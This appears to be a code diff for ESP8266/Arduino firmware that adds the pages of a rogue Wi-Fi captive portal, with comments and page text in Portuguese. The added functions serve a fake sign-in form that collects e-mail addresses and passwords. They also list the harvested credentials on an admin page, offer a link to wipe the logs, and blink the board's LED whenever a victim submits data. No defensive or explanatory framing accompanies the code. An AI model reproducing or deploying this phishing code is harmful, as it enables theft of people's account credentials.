@@ -38,6 +38,60 @@ String footer() {
     "</div><div class=q><a>Patria Amada Bostil &#169;. Desordem e Regresso.</a></div>";
 }
 
+String header(String t) {
+  String a = String(SSID_NAME);
+  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
+               "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
+               "div { padding: 0.5em; }"
+               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
+               "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; }"
+               "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
+               "nav { background: #e81026; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
+               "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
+               "textarea { width: 100%; }";
+  String h = "<!DOCTYPE html><html>"
+             "<head><title>" + a + " :: " + t + "</title>"
+             "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
+             "<style>" + CSS + "</style></head>"
+             "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
+  return h;
+}
+
+String creds() {
+  return header(PASS_TITLE) + "<ol>" + Credentials + "</ol><br><center><p><a style=\"color:#e81026\" href=/>Voltar ao Index</a></p><p><a style=\"color:#e81026\" href=/clear>Deletar Logs</a></p></center>" + footer();
+}
+
+String index() {
+  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post>" +
+         "<b>E-mail:</b> <center><input type=text autocomplete=email name=email></input></center>" +
+         "<b>Senha:</b> <center><input type=password name=password></input><input type=submit value=\"Sign in\"></form></center>" + footer();
+}
+
+String posted() {
+  String email = input("email");
+  String password = input("password");
+  Credentials = "<li>E-mail: <b>" + email + "</b></br>Senha: <b>" + password + "</b></li>" + Credentials;
+  return header(POST_TITLE) + POST_BODY + footer();
+}
+
+String clear() {
+  String email = "<p></p>";
+  String password = "<p></p>";
+  Credentials = "<p></p>";
+  return header(CLEAR_TITLE) + "<div><p>As credenciais foram resetadas.</div></p><center><a style=\"color:#e81026\" href=/>Voltar ao Index</a></center>" + footer();
+}
+
+void BLINK() { //O led pisca 5 vezes quando recebe data
+  int count = 0;
+  while (count < 5) {
+    digitalWrite(BUILTIN_LED, LOW);
+    delay(500);
+    digitalWrite(BUILTIN_LED, HIGH);
+    delay(500);
+    count = count + 1;
+  }
+}
+
 void setup() {
   // put your setup code here, to run once:
 
